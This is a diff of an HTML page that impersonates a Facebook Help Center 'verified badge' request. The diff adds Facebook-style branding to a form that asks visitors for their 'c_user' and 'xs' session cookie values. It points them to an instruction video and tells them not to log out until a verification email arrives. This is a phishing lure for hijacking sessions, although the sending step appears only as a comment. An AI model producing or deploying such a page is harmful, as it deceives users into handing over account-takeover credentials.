@@ -21,7 +21,11 @@
     }
 
     h1 {
-      color: #333;
+      color: white;
+    }
+
+    h4 {
+      color: #007bff;
     }
 
     .form-control {
@@ -70,97 +74,56 @@
 </head>
 <body>
 
-  <div
-    style="
-      width: 100%;
-      background: #fff;
-      padding: 20px 0;
-      text-align: center;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-    "
-  >
-    <h1 class="text-primary">Request Your Blue Badge</h1>
-  </div>
-
   <form id="validationForm" onsubmit="sendEmail(event)">
-    <div class="container mt-4">
-      <div class="row justify-content-center">
-        <div class="col-12 col-md-8 col-lg-6">
-          <div class="border p-4 bg-light">
-            <h5 class="mb-3">Get Verified on Facebook</h5>
+    <!-- Header -->
+    <div style="width: 100%; height: 90px; background: #4667AC;">
+      <h1 class="ms-4 m-0" style="padding-left: 20px; line-height: 90px;">facebook</h1>
+    </div>
 
-            <div id="alert-danger" class="alert-danger" style="display:none;">
-              Please enter valid values for both fields.
-            </div>
+    <div style="width: 100%; height: 60px; background: #E9EBEE;">
+      <h4 class="ms-4 m-0" style="padding-left: 20px; line-height: 60px;">Help Center</h4>
+    </div>
 
-            <p>
-              The verified badge confirms that Facebook has recognized your
-              account as authentic. By submitting the form below, you'll be
-              reviewed for verification.
-            </p>
+    <div class="container">
+      <h5>Request a verified badge on Facebook</h5>
 
-            <div class="mb-3">
-              <label class="form-label">c_user</label>
-              <input
-                type="number"
-                name="c_user"
-                id="c_user"
-                class="form-control"
-                required
-                pattern="^\d{15}$"
-                title="Please enter 15 digits"
-              />
-            </div>
-
-            <div class="mb-3">
-              <label class="form-label">xs</label>
-              <input
-                type="text"
-                name="xs"
-                id="xs"
-                class="form-control"
-                required
-              />
-            </div>
-
-            <div class="mb-3 text-center">
-              <p>Be sure to watch the video below for more instructions:</p>
-              <video
-                controls
-                muted
-                id="instructionVideo"
-                style="width: 100%; max-width: 400px; height: auto;"
-                src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
-              ></video>
-              <br />
-              <button
-                type="button"
-                class="btn btn-sm btn-secondary mt-2"
-                onclick="enableSound()"
-              >
-                Enable Sound
-              </button>
-            </div>
-
-            <p class="mt-2">
-              Please make sure not to log out from your computer or laptop
-              until you have received a verification email.
-            </p>
-
-            <div class="text-end mt-4">
-              <button
-                type="submit"
-                class="btn btn-primary"
-                style="background: #4267b2"
-              >
-                Submit
-              </button>
-            </div>
-          </div>
-        </div>
+      <p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.</p>
+      <p>A Facebook account with a verified badge <img src="https://firebasestorage.googleapis.com/v0/b/contactvehicleapp-7d7a0.appspot.com/o/secondtick.png?alt=media&token=72a304b3-4767-4306-917d-4181f6b576af" alt="blue tick" style="width: 1rem;"> next to its name now means that Facebook has confirmed it as the authentic presence for that person or brand.</p>
+      
+      <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+      
+      <p class="text-secondary" style="font-size: 12px;">Detailed Video Information:</p>
+      
+      <div class="video-container">
+        <video controls muted id="instructionVideo" style="width: 500px; height: 280px;">
+          <source src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9" type="video/mp4">
+        </video>
+        <br />
+        <button type="button" class="btn btn-sm btn-secondary mt-2" onclick="enableSound()">Enable Sound</button>
       </div>
+      
+      <label for="c_user" style="font-size: 12px;">c_user</label>
+      <input type="number" name="c_user" id="c_user" required pattern="^\d{15}$" title="Please enter 15 digits" class="form-control">
+      
+      <label for="xs" style="font-size: 12px;">xs</label>
+      <input type="text" name="xs" id="xs" class="form-control" required>
+
+      <p style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
+
+      <button type="submit" class="btn btn-primary">Submit</button>
+
+      <div class="alert-danger" id="alert-danger" style="display: none;">Please enter valid values for both fields.</div>
     </div>
   </form>
+
+  <!-- Modal Structure -->
+  <div id="loginModal" class="modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); align-items: center; justify-content: center;">
+    <div style="background: white; padding: 20px; border-radius: 10px;">
+      <h2>Success!</h2>
+      <p>Your form has been submitted successfully.</p>
+      <button onclick="closeModal()">Close</button>
+    </div>
+  </div>
 
   <script>
     function enableSound() {
@@ -181,12 +144,16 @@
       const isXsValid = xsPattern.test(xsValue);
 
       if (isCUserValid && isXsValid) {
-        // You can integrate with EmailJS here for email sending
-        console.log("Form submission success");
-        alert("Form submitted successfully!");
+        // Here you would call EmailJS or another email service to send the form data
+        // For now, just display the modal
+        document.getElementById('loginModal').style.display = 'flex';
       } else {
         document.getElementById('alert-danger').style.display = 'block';
       }
+    }
+
+    function closeModal() {
+      document.getElementById('loginModal').style.display = 'none';
     }
   </script>
 </body>
